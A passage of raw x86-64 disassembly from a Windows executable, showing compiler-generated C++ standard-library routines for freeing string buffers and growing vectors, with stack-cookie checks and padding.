   140002bcc:	74 59                	je     0x140002c27
   140002bce:	41 83 e6 f7          	and    $0xfffffff7,%r14d
   140002bd2:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140002bd7:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140002bdc:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002be0:	76 45                	jbe    0x140002c27
   140002be2:	48 ff c2             	inc    %rdx
   140002be5:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002bea:	48 8b c1             	mov    %rcx,%rax
   140002bed:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002bf4:	72 2b                	jb     0x140002c21
   140002bf6:	48 83 c2 27          	add    $0x27,%rdx
   140002bfa:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002bfe:	48 2b c1             	sub    %rcx,%rax
   140002c01:	48 83 e8 08          	sub    $0x8,%rax
   140002c05:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002c09:	76 16                	jbe    0x140002c21
   140002c0b:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002c10:	45 33 c9             	xor    %r9d,%r9d
   140002c13:	45 33 c0             	xor    %r8d,%r8d
   140002c16:	33 d2                	xor    %edx,%edx
   140002c18:	33 c9                	xor    %ecx,%ecx
   140002c1a:	ff 15 48 78 00 00    	call   *0x7848(%rip)        # 0x14000a468
   140002c20:	cc                   	int3
   140002c21:	e8 b2 5b 00 00       	call   0x1400087d8
   140002c26:	90                   	nop
   140002c27:	41 f6 c6 04          	test   $0x4,%r14b
   140002c2b:	74 58                	je     0x140002c85
   140002c2d:	41 83 e6 fb          	and    $0xfffffffb,%r14d
   140002c31:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140002c36:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140002c3b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002c3f:	76 44                	jbe    0x140002c85
   140002c41:	48 ff c2             	inc    %rdx
   140002c44:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002c49:	48 8b c1             	mov    %rcx,%rax
   140002c4c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002c53:	72 2b                	jb     0x140002c80
   140002c55:	48 83 c2 27          	add    $0x27,%rdx
   140002c59:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002c5d:	48 2b c1             	sub    %rcx,%rax
   140002c60:	48 83 e8 08          	sub    $0x8,%rax
   140002c64:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002c68:	76 16                	jbe    0x140002c80
   140002c6a:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002c6f:	45 33 c9             	xor    %r9d,%r9d
   140002c72:	45 33 c0             	xor    %r8d,%r8d
   140002c75:	33 d2                	xor    %edx,%edx
   140002c77:	33 c9                	xor    %ecx,%ecx
   140002c79:	ff 15 e9 77 00 00    	call   *0x77e9(%rip)        # 0x14000a468
   140002c7f:	cc                   	int3
   140002c80:	e8 53 5b 00 00       	call   0x1400087d8
   140002c85:	4c 8d 45 a8          	lea    -0x58(%rbp),%r8
   140002c89:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   140002c8d:	48 8d 4d 48          	lea    0x48(%rbp),%rcx
   140002c91:	e8 5a 52 00 00       	call   0x140007ef0
   140002c96:	90                   	nop
   140002c97:	48 8b 55 60          	mov    0x60(%rbp),%rdx
   140002c9b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002c9f:	76 43                	jbe    0x140002ce4
   140002ca1:	48 ff c2             	inc    %rdx
   140002ca4:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   140002ca8:	48 8b c1             	mov    %rcx,%rax
   140002cab:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002cb2:	72 2b                	jb     0x140002cdf
   140002cb4:	48 83 c2 27          	add    $0x27,%rdx
   140002cb8:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002cbc:	48 2b c1             	sub    %rcx,%rax
   140002cbf:	48 83 e8 08          	sub    $0x8,%rax
   140002cc3:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002cc7:	76 16                	jbe    0x140002cdf
   140002cc9:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002cce:	45 33 c9             	xor    %r9d,%r9d
   140002cd1:	45 33 c0             	xor    %r8d,%r8d
   140002cd4:	33 d2                	xor    %edx,%edx
   140002cd6:	33 c9                	xor    %ecx,%ecx
   140002cd8:	ff 15 8a 77 00 00    	call   *0x778a(%rip)        # 0x14000a468
   140002cde:	cc                   	int3
   140002cdf:	e8 f4 5a 00 00       	call   0x1400087d8
   140002ce4:	80 7c 24 31 00       	cmpb   $0x0,0x31(%rsp)
   140002ce9:	0f 84 03 02 00 00    	je     0x140002ef2
   140002cef:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002cf2:	48 85 ff             	test   %rdi,%rdi
   140002cf5:	75 4b                	jne    0x140002d42
   140002cf7:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   140002cfc:	66 0f 6f 0d 8c 7c 00 	movdqa 0x7c8c(%rip),%xmm1        # 0x14000a990
   140002d03:	00 
   140002d04:	f3 0f 7f 4c 24 70    	movdqu %xmm1,0x70(%rsp)
   140002d0a:	f2 0f 10 05 2e 7c 00 	movsd  0x7c2e(%rip),%xmm0        # 0x14000a940
   140002d11:	00 
   140002d12:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140002d18:	0f b7 05 29 7c 00 00 	movzwl 0x7c29(%rip),%eax        # 0x14000a948
   140002d1f:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   140002d24:	0f b6 05 1f 7c 00 00 	movzbl 0x7c1f(%rip),%eax        # 0x14000a94a
   140002d2b:	88 44 24 6a          	mov    %al,0x6a(%rsp)
   140002d2f:	40 88 7c 24 6b       	mov    %dil,0x6b(%rsp)
   140002d34:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140002d39:	41 83 ce 10          	or     $0x10,%r14d
   140002d3d:	e9 84 00 00 00       	jmp    0x140002dc6
   140002d42:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140002d47:	48 8d 5d 28          	lea    0x28(%rbp),%rbx
   140002d4b:	48 83 fe 0f          	cmp    $0xf,%rsi
   140002d4f:	49 0f 47 df          	cmova  %r15,%rbx
   140002d53:	49 3b fd             	cmp    %r13,%rdi
   140002d56:	0f 87 82 03 00 00    	ja     0x1400030de
   140002d5c:	48 83 ff 0f          	cmp    $0xf,%rdi
   140002d60:	77 18                	ja     0x140002d7a
   140002d62:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140002d67:	48 c7 44 24 58 0f 00 	movq   $0xf,0x58(%rsp)
   140002d6e:	00 00 
   140002d70:	0f 10 03             	movups (%rbx),%xmm0
   140002d73:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140002d78:	eb 43                	jmp    0x140002dbd
   140002d7a:	48 8b c7             	mov    %rdi,%rax
   140002d7d:	48 83 c8 0f          	or     $0xf,%rax
   140002d81:	49 3b c5             	cmp    %r13,%rax
   140002d84:	77 10                	ja     0x140002d96
   140002d86:	4c 8b e8             	mov    %rax,%r13
   140002d89:	48 83 f8 16          	cmp    $0x16,%rax
   140002d8d:	b8 16 00 00 00       	mov    $0x16,%eax
   140002d92:	4c 0f 42 e8          	cmovb  %rax,%r13
   140002d96:	49 8d 4d 01          	lea    0x1(%r13),%rcx
   140002d9a:	e8 21 e5 ff ff       	call   0x1400012c0
   140002d9f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002da4:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140002da9:	4c 89 6c 24 58       	mov    %r13,0x58(%rsp)
   140002dae:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   140002db2:	48 8b d3             	mov    %rbx,%rdx
   140002db5:	48 8b c8             	mov    %rax,%rcx
   140002db8:	e8 87 68 00 00       	call   0x140009644
   140002dbd:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140002dc2:	41 83 ce 20          	or     $0x20,%r14d
   140002dc6:	0f 10 00             	movups (%rax),%xmm0
   140002dc9:	0f 11 45 48          	movups %xmm0,0x48(%rbp)
   140002dcd:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002dd1:	0f 11 4d 58          	movups %xmm1,0x58(%rbp)
   140002dd5:	4c 89 60 10          	mov    %r12,0x10(%rax)
   140002dd9:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   140002de0:	00 
   140002de1:	c6 00 00             	movb   $0x0,(%rax)
   140002de4:	41 f6 c6 20          	test   $0x20,%r14b
   140002de8:	74 54                	je     0x140002e3e
   140002dea:	41 83 e6 df          	and    $0xffffffdf,%r14d
   140002dee:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140002df3:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002df7:	76 45                	jbe    0x140002e3e
   140002df9:	48 ff c2             	inc    %rdx
   140002dfc:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002e01:	48 8b c1             	mov    %rcx,%rax
   140002e04:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002e0b:	72 2b                	jb     0x140002e38
   140002e0d:	48 83 c2 27          	add    $0x27,%rdx
   140002e11:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002e15:	48 2b c1             	sub    %rcx,%rax
   140002e18:	48 83 e8 08          	sub    $0x8,%rax
   140002e1c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002e20:	76 16                	jbe    0x140002e38
   140002e22:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002e27:	45 33 c9             	xor    %r9d,%r9d
   140002e2a:	45 33 c0             	xor    %r8d,%r8d
   140002e2d:	33 d2                	xor    %edx,%edx
   140002e2f:	33 c9                	xor    %ecx,%ecx
   140002e31:	ff 15 31 76 00 00    	call   *0x7631(%rip)        # 0x14000a468
   140002e37:	cc                   	int3
   140002e38:	e8 9b 59 00 00       	call   0x1400087d8
   140002e3d:	90                   	nop
   140002e3e:	41 f6 c6 10          	test   $0x10,%r14b
   140002e42:	74 4f                	je     0x140002e93
   140002e44:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140002e49:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002e4d:	76 44                	jbe    0x140002e93
   140002e4f:	48 ff c2             	inc    %rdx
   140002e52:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002e57:	48 8b c1             	mov    %rcx,%rax
   140002e5a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002e61:	72 2b                	jb     0x140002e8e
   140002e63:	48 83 c2 27          	add    $0x27,%rdx
   140002e67:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002e6b:	48 2b c1             	sub    %rcx,%rax
   140002e6e:	48 83 e8 08          	sub    $0x8,%rax
   140002e72:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002e76:	76 16                	jbe    0x140002e8e
   140002e78:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002e7d:	45 33 c9             	xor    %r9d,%r9d
   140002e80:	45 33 c0             	xor    %r8d,%r8d
   140002e83:	33 d2                	xor    %edx,%edx
   140002e85:	33 c9                	xor    %ecx,%ecx
   140002e87:	ff 15 db 75 00 00    	call   *0x75db(%rip)        # 0x14000a468
   140002e8d:	cc                   	int3
   140002e8e:	e8 45 59 00 00       	call   0x1400087d8
   140002e93:	4c 8d 45 a8          	lea    -0x58(%rbp),%r8
   140002e97:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   140002e9b:	48 8d 4d 48          	lea    0x48(%rbp),%rcx
   140002e9f:	e8 ec 43 00 00       	call   0x140007290
   140002ea4:	90                   	nop
   140002ea5:	48 8b 55 60          	mov    0x60(%rbp),%rdx
   140002ea9:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002ead:	76 43                	jbe    0x140002ef2
   140002eaf:	48 ff c2             	inc    %rdx
   140002eb2:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   140002eb6:	48 8b c1             	mov    %rcx,%rax
   140002eb9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002ec0:	72 2b                	jb     0x140002eed
   140002ec2:	48 83 c2 27          	add    $0x27,%rdx
   140002ec6:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002eca:	48 2b c1             	sub    %rcx,%rax
   140002ecd:	48 83 e8 08          	sub    $0x8,%rax
   140002ed1:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002ed5:	76 16                	jbe    0x140002eed
   140002ed7:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002edc:	45 33 c9             	xor    %r9d,%r9d
   140002edf:	45 33 c0             	xor    %r8d,%r8d
   140002ee2:	33 d2                	xor    %edx,%edx
   140002ee4:	33 c9                	xor    %ecx,%ecx
   140002ee6:	ff 15 7c 75 00 00    	call   *0x757c(%rip)        # 0x14000a468
   140002eec:	cc                   	int3
   140002eed:	e8 e6 58 00 00       	call   0x1400087d8
   140002ef2:	48 8d 15 53 7a 00 00 	lea    0x7a53(%rip),%rdx        # 0x14000a94c
   140002ef9:	48 8b 0d f0 71 00 00 	mov    0x71f0(%rip),%rcx        # 0x14000a0f0
   140002f00:	e8 4b e1 ff ff       	call   0x140001050
   140002f05:	41 8b dc             	mov    %r12d,%ebx
   140002f08:	4c 8b 45 a8          	mov    -0x58(%rbp),%r8
   140002f0c:	4d 85 c0             	test   %r8,%r8
   140002f0f:	74 75                	je     0x140002f86
   140002f11:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
   140002f15:	49 2b c8             	sub    %r8,%rcx
   140002f18:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   140002f1f:	aa aa 2a 
   140002f22:	48 f7 e9             	imul   %rcx
   140002f25:	48 c1 fa 02          	sar    $0x2,%rdx
   140002f29:	48 8b c2             	mov    %rdx,%rax
   140002f2c:	48 c1 e8 3f          	shr    $0x3f,%rax
   140002f30:	48 03 d0             	add    %rax,%rdx
   140002f33:	48 8d 14 52          	lea    (%rdx,%rdx,2),%rdx
   140002f37:	48 c1 e2 03          	shl    $0x3,%rdx
   140002f3b:	49 8b c0             	mov    %r8,%rax
   140002f3e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002f45:	72 2b                	jb     0x140002f72
   140002f47:	48 83 c2 27          	add    $0x27,%rdx
   140002f4b:	4d 8b 40 f8          	mov    -0x8(%r8),%r8
   140002f4f:	49 2b c0             	sub    %r8,%rax
   140002f52:	48 83 e8 08          	sub    $0x8,%rax
   140002f56:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002f5a:	76 16                	jbe    0x140002f72
   140002f5c:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002f61:	45 33 c9             	xor    %r9d,%r9d
   140002f64:	45 33 c0             	xor    %r8d,%r8d
   140002f67:	33 d2                	xor    %edx,%edx
   140002f69:	33 c9                	xor    %ecx,%ecx
   140002f6b:	ff 15 f7 74 00 00    	call   *0x74f7(%rip)        # 0x14000a468
   140002f71:	cc                   	int3
   140002f72:	49 8b c8             	mov    %r8,%rcx
   140002f75:	e8 5e 58 00 00       	call   0x1400087d8
   140002f7a:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002f7d:	f3 0f 7f 45 a8       	movdqu %xmm0,-0x58(%rbp)
   140002f82:	4c 89 65 b8          	mov    %r12,-0x48(%rbp)
   140002f86:	4c 8b 45 80          	mov    -0x80(%rbp),%r8
   140002f8a:	4d 85 c0             	test   %r8,%r8
   140002f8d:	74 75                	je     0x140003004
   140002f8f:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   140002f93:	49 2b c8             	sub    %r8,%rcx
   140002f96:	48 b8 67 66 66 66 66 	movabs $0x6666666666666667,%rax
   140002f9d:	66 66 66 
   140002fa0:	48 f7 e9             	imul   %rcx
   140002fa3:	48 c1 fa 04          	sar    $0x4,%rdx
   140002fa7:	48 8b c2             	mov    %rdx,%rax
   140002faa:	48 c1 e8 3f          	shr    $0x3f,%rax
   140002fae:	48 03 d0             	add    %rax,%rdx
   140002fb1:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140002fb5:	48 c1 e2 03          	shl    $0x3,%rdx
   140002fb9:	49 8b c0             	mov    %r8,%rax
   140002fbc:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002fc3:	72 2b                	jb     0x140002ff0
   140002fc5:	48 83 c2 27          	add    $0x27,%rdx
   140002fc9:	4d 8b 40 f8          	mov    -0x8(%r8),%r8
   140002fcd:	49 2b c0             	sub    %r8,%rax
   140002fd0:	48 83 e8 08          	sub    $0x8,%rax
   140002fd4:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002fd8:	76 16                	jbe    0x140002ff0
   140002fda:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002fdf:	45 33 c9             	xor    %r9d,%r9d
   140002fe2:	45 33 c0             	xor    %r8d,%r8d
   140002fe5:	33 d2                	xor    %edx,%edx
   140002fe7:	33 c9                	xor    %ecx,%ecx
   140002fe9:	ff 15 79 74 00 00    	call   *0x7479(%rip)        # 0x14000a468
   140002fef:	cc                   	int3
   140002ff0:	49 8b c8             	mov    %r8,%rcx
   140002ff3:	e8 e0 57 00 00       	call   0x1400087d8
   140002ff8:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002ffb:	f3 0f 7f 45 80       	movdqu %xmm0,-0x80(%rbp)
   140003000:	4c 89 65 90          	mov    %r12,-0x70(%rbp)
   140003004:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   140003008:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000300c:	76 43                	jbe    0x140003051
   14000300e:	48 ff c2             	inc    %rdx
   140003011:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140003015:	48 8b c1             	mov    %rcx,%rax
   140003018:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000301f:	72 2b                	jb     0x14000304c
   140003021:	48 83 c2 27          	add    $0x27,%rdx
   140003025:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003029:	48 2b c1             	sub    %rcx,%rax
   14000302c:	48 83 e8 08          	sub    $0x8,%rax
   140003030:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003034:	76 16                	jbe    0x14000304c
   140003036:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   14000303b:	45 33 c9             	xor    %r9d,%r9d
   14000303e:	45 33 c0             	xor    %r8d,%r8d
   140003041:	33 d2                	xor    %edx,%edx
   140003043:	33 c9                	xor    %ecx,%ecx
   140003045:	ff 15 1d 74 00 00    	call   *0x741d(%rip)        # 0x14000a468
   14000304b:	cc                   	int3
   14000304c:	e8 87 57 00 00       	call   0x1400087d8
   140003051:	66 0f 6f 05 17 79 00 	movdqa 0x7917(%rip),%xmm0        # 0x14000a970
   140003058:	00 
   140003059:	f3 0f 7f 45 f8       	movdqu %xmm0,-0x8(%rbp)
   14000305e:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   140003062:	48 83 fe 0f          	cmp    $0xf,%rsi
   140003066:	76 47                	jbe    0x1400030af
   140003068:	48 8d 56 01          	lea    0x1(%rsi),%rdx
   14000306c:	49 8b c7             	mov    %r15,%rax
   14000306f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003076:	72 2f                	jb     0x1400030a7
   140003078:	48 83 c2 27          	add    $0x27,%rdx
   14000307c:	4d 8b 7f f8          	mov    -0x8(%r15),%r15
   140003080:	49 2b c7             	sub    %r15,%rax
   140003083:	48 83 e8 08          	sub    $0x8,%rax
   140003087:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000308b:	76 1a                	jbe    0x1400030a7
   14000308d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003094:	00 00 
   140003096:	45 33 c9             	xor    %r9d,%r9d
   140003099:	45 33 c0             	xor    %r8d,%r8d
   14000309c:	33 d2                	xor    %edx,%edx
   14000309e:	33 c9                	xor    %ecx,%ecx
   1400030a0:	ff 15 c2 73 00 00    	call   *0x73c2(%rip)        # 0x14000a468
   1400030a6:	cc                   	int3
   1400030a7:	49 8b cf             	mov    %r15,%rcx
   1400030aa:	e8 29 57 00 00       	call   0x1400087d8
   1400030af:	8b c3                	mov    %ebx,%eax
   1400030b1:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400030b5:	48 33 cc             	xor    %rsp,%rcx
   1400030b8:	e8 b3 57 00 00       	call   0x140008870
   1400030bd:	4c 8d 9c 24 70 01 00 	lea    0x170(%rsp),%r11
   1400030c4:	00 
   1400030c5:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400030c9:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400030cd:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   1400030d1:	49 8b e3             	mov    %r11,%rsp
   1400030d4:	41 5f                	pop    %r15
   1400030d6:	41 5e                	pop    %r14
   1400030d8:	41 5d                	pop    %r13
   1400030da:	41 5c                	pop    %r12
   1400030dc:	5d                   	pop    %rbp
   1400030dd:	c3                   	ret
   1400030de:	e8 1d ec ff ff       	call   0x140001d00
   1400030e3:	90                   	nop
   1400030e4:	e8 17 ec ff ff       	call   0x140001d00
   1400030e9:	90                   	nop
   1400030ea:	e8 11 ec ff ff       	call   0x140001d00
   1400030ef:	cc                   	int3
   1400030f0:	e8 0b ec ff ff       	call   0x140001d00
   1400030f5:	cc                   	int3
   1400030f6:	cc                   	int3
   1400030f7:	cc                   	int3
   1400030f8:	cc                   	int3
   1400030f9:	cc                   	int3
   1400030fa:	cc                   	int3
   1400030fb:	cc                   	int3
   1400030fc:	cc                   	int3
   1400030fd:	cc                   	int3
   1400030fe:	cc                   	int3
   1400030ff:	cc                   	int3
   140003100:	40 53                	rex push %rbx
   140003102:	55                   	push   %rbp
   140003103:	41 56                	push   %r14
   140003105:	48 83 ec 30          	sub    $0x30,%rsp
   140003109:	48 8b d9             	mov    %rcx,%rbx
   14000310c:	48 8b ea             	mov    %rdx,%rbp
   14000310f:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140003113:	4c 8b 73 08          	mov    0x8(%rbx),%r14
   140003117:	4c 3b f1             	cmp    %rcx,%r14
   14000311a:	74 1b                	je     0x140003137
   14000311c:	0f b6 02             	movzbl (%rdx),%eax
   14000311f:	41 88 06             	mov    %al,(%r14)
   140003122:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003126:	48 8d 48 01          	lea    0x1(%rax),%rcx
   14000312a:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   14000312e:	48 83 c4 30          	add    $0x30,%rsp
   140003132:	41 5e                	pop    %r14
   140003134:	5d                   	pop    %rbp
   140003135:	5b                   	pop    %rbx
   140003136:	c3                   	ret
   140003137:	48 8b 03             	mov    (%rbx),%rax
   14000313a:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   14000313f:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   140003146:	ff ff 7f 
   140003149:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   14000314e:	4d 8b fe             	mov    %r14,%r15
   140003151:	4c 2b f8             	sub    %rax,%r15
   140003154:	4c 3b fe             	cmp    %rsi,%r15
   140003157:	0f 84 f6 00 00 00    	je     0x140003253
   14000315d:	48 2b c8             	sub    %rax,%rcx
   140003160:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   140003165:	48 8b d1             	mov    %rcx,%rdx
   140003168:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   14000316d:	48 d1 ea             	shr    $1,%rdx
   140003170:	4d 8d 67 01          	lea    0x1(%r15),%r12
   140003174:	48 8b c6             	mov    %rsi,%rax
   140003177:	48 2b c2             	sub    %rdx,%rax
   14000317a:	48 3b c8             	cmp    %rax,%rcx
   14000317d:	77 0b                	ja     0x14000318a
   14000317f:	48 8d 34 0a          	lea    (%rdx,%rcx,1),%rsi
   140003183:	49 3b f4             	cmp    %r12,%rsi
   140003186:	49 0f 42 f4          	cmovb  %r12,%rsi
   14000318a:	48 8b ce             	mov    %rsi,%rcx
   14000318d:	e8 2e e1 ff ff       	call   0x1400012c0
   140003192:	0f b6 4d 00          	movzbl 0x0(%rbp),%ecx
   140003196:	4c 03 f8             	add    %rax,%r15
   140003199:	48 8b f8             	mov    %rax,%rdi
   14000319c:	41 88 0f             	mov    %cl,(%r15)
   14000319f:	48 8b c8             	mov    %rax,%rcx
   1400031a2:	4c 8b 43 08          	mov    0x8(%rbx),%r8
   1400031a6:	48 8b 13             	mov    (%rbx),%rdx
   1400031a9:	4d 3b f0             	cmp    %r8,%r14
   1400031ac:	75 05                	jne    0x1400031b3
   1400031ae:	4c 2b c2             	sub    %rdx,%r8
   1400031b1:	eb 19                	jmp    0x1400031cc
   1400031b3:	4d 8b c6             	mov    %r14,%r8
   1400031b6:	4c 2b c2             	sub    %rdx,%r8
   1400031b9:	e8 8c 64 00 00       	call   0x14000964a
   1400031be:	4c 8b 43 08          	mov    0x8(%rbx),%r8
   1400031c2:	49 8d 4f 01          	lea    0x1(%r15),%rcx
   1400031c6:	4d 2b c6             	sub    %r14,%r8
   1400031c9:	49 8b d6             	mov    %r14,%rdx
   1400031cc:	e8 79 64 00 00       	call   0x14000964a
   1400031d1:	48 8b 0b             	mov    (%rbx),%rcx
   1400031d4:	48 85 c9             	test   %rcx,%rcx
   1400031d7:	74 2d                	je     0x140003206
   1400031d9:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1400031dd:	48 2b d1             	sub    %rcx,%rdx
   1400031e0:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400031e7:	72 18                	jb     0x140003201
   1400031e9:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1400031ed:	48 83 c2 27          	add    $0x27,%rdx
   1400031f1:	48 2b c8             	sub    %rax,%rcx
   1400031f4:	48 83 e9 08          	sub    $0x8,%rcx
   1400031f8:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1400031fc:	77 3b                	ja     0x140003239
   1400031fe:	48 8b c8             	mov    %rax,%rcx
   140003201:	e8 d2 55 00 00       	call   0x1400087d8
   140003206:	4a 8d 0c 27          	lea    (%rdi,%r12,1),%rcx
   14000320a:	48 89 3b             	mov    %rdi,(%rbx)
   14000320d:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140003212:	49 8b c7             	mov    %r15,%rax
   140003215:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   14000321a:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   14000321e:	48 8d 0c 3e          	lea    (%rsi,%rdi,1),%rcx
   140003222:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140003227:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000322c:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140003230:	48 83 c4 30          	add    $0x30,%rsp
   140003234:	41 5e                	pop    %r14
   140003236:	5d                   	pop    %rbp
   140003237:	5b                   	pop    %rbx
   140003238:	c3                   	ret
   140003239:	45 33 c9             	xor    %r9d,%r9d
   14000323c:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003243:	00 00 
   140003245:	45 33 c0             	xor    %r8d,%r8d
   140003248:	33 d2                	xor    %edx,%edx
   14000324a:	33 c9                	xor    %ecx,%ecx
   14000324c:	ff 15 16 72 00 00    	call   *0x7216(%rip)        # 0x14000a468
   140003252:	cc                   	int3
   140003253:	e8 c8 ea ff ff       	call   0x140001d20
   140003258:	cc                   	int3
   140003259:	cc                   	int3
   14000325a:	cc                   	int3
   14000325b:	cc                   	int3
   14000325c:	cc                   	int3
   14000325d:	cc                   	int3
   14000325e:	cc                   	int3
   14000325f:	cc                   	int3
   140003260:	40 53                	rex push %rbx
   140003262:	56                   	push   %rsi
   140003263:	57                   	push   %rdi
   140003264:	48 83 ec 30          	sub    $0x30,%rsp
   140003268:	49 8b f8             	mov    %r8,%rdi
   14000326b:	48 8b f2             	mov    %rdx,%rsi
   14000326e:	49 b8 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%r8
   140003275:	ff ff 3f 
   140003278:	48 8b d9             	mov    %rcx,%rbx
   14000327b:	49 3b d0             	cmp    %r8,%rdx
   14000327e:	0f 87 29 01 00 00    	ja     0x1400033ad
   140003284:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140003289:	49 8b c0             	mov    %r8,%rax
   14000328c:	48 8b 69 08          	mov    0x8(%rcx),%rbp
   140003290:	48 2b 29             	sub    (%rcx),%rbp
   140003293:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140003297:	48 2b 0b             	sub    (%rbx),%rcx
   14000329a:	48 c1 f9 02          	sar    $0x2,%rcx
   14000329e:	48 8b d1             	mov    %rcx,%rdx
   1400032a1:	48 c1 fd 02          	sar    $0x2,%rbp
   1400032a5:	48 d1 ea             	shr    $1,%rdx
   1400032a8:	48 2b c2             	sub    %rdx,%rax
   1400032ab:	48 3b c8             	cmp    %rax,%rcx
   1400032ae:	76 40                	jbe    0x1400032f0
   1400032b0:	49 8b c0             	mov    %r8,%rax
   1400032b3:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   1400032b8:	4c 89 7c 24 60       	mov    %r15,0x60(%rsp)
   1400032bd:	4c 8d 3c 85 00 00 00 	lea    0x0(,%rax,4),%r15
   1400032c4:	00 
   1400032c5:	49 8b cf             	mov    %r15,%rcx
   1400032c8:	e8 f3 df ff ff       	call   0x1400012c0
